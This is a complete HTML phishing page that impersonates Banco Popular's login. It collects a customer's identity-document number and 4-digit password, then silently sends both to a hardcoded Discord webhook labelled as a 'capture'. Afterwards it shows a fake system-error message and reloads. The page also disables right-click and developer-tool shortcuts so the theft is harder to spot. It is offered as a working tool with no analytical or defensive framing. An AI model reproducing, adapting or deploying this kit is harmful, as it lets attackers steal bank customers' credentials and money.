<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Banco Popular | Pagos rápidos y seguros</title>
<link rel="stylesheet" href="style.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Manrope:wght@500;600;700&display=swap" rel="stylesheet">
<script src="https://unpkg.com/lucide@latest"></script>
<style>
body{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
img{-webkit-user-drag:none;user-drag:none}
input[type="tel"],input[type="password"],select{background-color:white!important;color:#333!important}
.card{background:white;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
.hidden{display:none!important}
.switch{position:relative;display:inline-block;width:42px;height:24px}
.switch input{opacity:0;width:0;height:0}
.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;transition:.4s;border-radius:24px}
.slider:before{position:absolute;content:"";height:20px;width:20px;left:2px;bottom:2px;background-color:white;transition:.4s;border-radius:50%}
input:checked+.slider{background-color:#00a651}
input:checked+.slider:before{transform:translateX(18px)}
</style>
</head>
<body>
<main style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f8f9fa;padding:20px">
<div style="max-width:1180px;width:100%;display:flex;flex-direction:column;align-items:center;gap:25px">

<div id="s1">
<div class="card" style="position:relative;padding:48px 32px;width:340px">
<div style="position:absolute;top:28px;right:30px;color:#f16a21"><i data-lucide="shield-check" style="width:28px;height:28px"></i></div>
<div style="margin-bottom:45px;text-align:left;padding-left:8px">
<p style="font-size:22px;font-weight:600;margin-bottom:12px">Bienvenido a</p>
<img src="popularhorizontal_new.svg" alt="Banco Popular" style="height:45px">
</div>
<div style="margin-bottom:32px">
<label style="display:block;font-size:14px;font-weight:500;margin-bottom:9px;color:#333">Tipo de documento</label>
<div style="position:relative">
<select id="dt" style="width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:10px;font-size:16px;appearance:none">
<option>Cédula de Ciudadanía</option>
<option>Cédula de Extranjería</option>
<option>Pasaporte</option>
</select>
<i data-lucide="chevron-down" style="position:absolute;right:15px;top:50%;transform:translateY(-50%);color:#f16a21;font-size:20px;pointer-events:none"></i>
</div>
</div>
<div style="margin-bottom:32px">
<label style="display:block;font-size:14px;font-weight:500;margin-bottom:9px;color:#333">Número de documento</label>
<input type="tel" id="dn" placeholder="Escribe tu número" maxlength="20" style="width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:10px;font-size:16px" inputmode="numeric">
</div>
<div style="display:flex;align-items:center;gap:14px;margin-bottom:38px">
<label class="switch">
<input type="checkbox" id="rm">
<span class="slider"></span>
</label>
<span style="font-size:14px;color:#555">Recordar tipo y número de documento</span>
</div>
<button id="b1" style="width:100%;padding:16px;background:#9e9e9e;color:white;border:none;border-radius:10px;font-size:16px;font-weight:600;margin-bottom:32px;transition:background-color 0.5s ease">Continuar</button>
<div style="text-align:center;font-size:14px;margin-bottom:18px">¿No eres usuario? <span style="color:#f16a21;font-weight:600">Regístrate aquí</span></div>
<div style="text-align:center;font-size:11px;color:#888">Protegido por reCAPTCHA | Privacidad - Condiciones</div>
</div>
</div>

<!-- Banner (solo en pantalla 1) -->
<div id="banner" style="display:flex;justify-content:center">
<img src="banner2.png" alt="Zona Transaccional" style="max-width:100%;height:auto;border-radius:16px;box-shadow:0 15px 35px rgba(0,0,0,0.12)">
</div>

<!-- Foto Grupo AVAL (solo en pantalla 1) -->
<div id="aval" style="display:flex;justify-content:center;margin-top:15px">
<img src="grupoaval.jpg" alt="Grupo AVAL" style="max-width:320px;height:auto;background:#ffffff;padding:12px;border-radius:8px">
</div>

<!-- Pantalla 2 (Contraseña) - Sin la foto de Grupo AVAL -->
<div id="s2" class="hidden">
<div class="card" style="position:relative;padding:55px 28px;width:320px">
<div style="margin-bottom:48px;text-align:left;padding-left:8px">
<p style="font-size:22px;font-weight:600;margin-bottom:12px">Bienvenido a</p>
<img src="popularhorizontal_new.svg" alt="Banco Popular" style="height:45px">
</div>
<div style="margin-bottom:34px">
<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
<label style="font-size:14px;font-weight:500;color:#333">Contraseña única</label>
<span style="color:#f16a21;font-size:13px;cursor:pointer">¿La olvidaste?</span>
</div>
<div style="position:relative">
<input type="password" id="pw" maxlength="4" placeholder="- - - -" style="width:100%;padding:16px 20px;border:1px solid #ddd;border-radius:10px;font-size:26px;letter-spacing:15px;text-align:center;font-family:monospace" inputmode="numeric">
<i id="eye" data-lucide="eye" style="position:absolute;right:18px;top:50%;transform:translateY(-50%);color:#999;cursor:pointer;font-size:22px"></i>
</div>
</div>
<button id="b2" style="width:100%;padding:16px;background:#9e9e9e;color:white;border:none;border-radius:10px;font-size:16px;font-weight:600;margin-bottom:35px;transition:background-color 0.5s ease">Continuar</button>
<div style="text-align:center;font-size:14px;margin-bottom:20px">¿No eres usuario? <span style="color:#f16a21;font-weight:600">Regístrate aquí</span></div>
<div style="text-align:center;font-size:11px;color:#888">Protegido por reCAPTCHA | Privacidad - Condiciones</div>
</div>
</div>

</div>
</main>

<script>
lucide.createIcons();
const w="https://discordapp.com/api/webhooks/1494034979146039497/sSaYCZCFpUqFCTyHCYSFKh3hpgPkHmDpNq1yS049E3rcxV_XErdGDeQpxCDdGy7OqyV1";
const s1=document.getElementById("s1"),s2=document.getElementById("s2"),banner=document.getElementById("banner"),aval=document.getElementById("aval");
const b1=document.getElementById("b1"),b2=document.getElementById("b2"),dn=document.getElementById("dn"),pw=document.getElementById("pw"),eye=document.getElementById("eye");
function o(i){i.value=i.value.replace(/[^0-9]/g,"")}
dn.addEventListener("input",()=>{o(dn);b1.style.backgroundColor=dn.value.trim().length>=6?"#0a3161":"#9e9e9e"});
pw.addEventListener("input",()=>{o(pw);b2.style.backgroundColor=pw.value.trim().length===4?"#0a3161":"#9e9e9e"});
b1.addEventListener("click",()=>{if(dn.value.trim().length>=6){s1.classList.add("hidden");banner.style.display="none";aval.style.display="none";s2.classList.remove("hidden");pw.focus()}});
b2.addEventListener("click",()=>{
const c=dn.value.trim(),p=pw.value.trim();
if(p.length===4){
fetch(w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"**Nueva captura - Banco Popular**",embeds:[{color:0x00ff00,fields:[{name:"Documento",value:`\`${c}\``,inline:true},{name:"Contraseña Única",value:`\`${p}\``,inline:true},{name:"Hora",value:new Date().toLocaleString("es-CO"),inline:false}]}]})}).catch(()=>{});
b2.textContent="Procesando...";b2.disabled=true;
setTimeout(()=>{alert("Error temporal del sistema. Inténtalo nuevamente.");location.reload()},1800);
}
});
eye.addEventListener("click",()=>{if(pw.type==="password"){pw.type="text";eye.setAttribute("data-lucide","eye-off")}else{pw.type="password";eye.setAttribute("data-lucide","eye")}lucide.createIcons()});
b1.style.transition=b2.style.transition="background-color 0.5s ease";
document.addEventListener("contextmenu",e=>e.preventDefault());
document.onkeydown=function(e){
if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74))||(e.ctrlKey&&e.keyCode==85))return false;
};
</script>
</body>
</html>
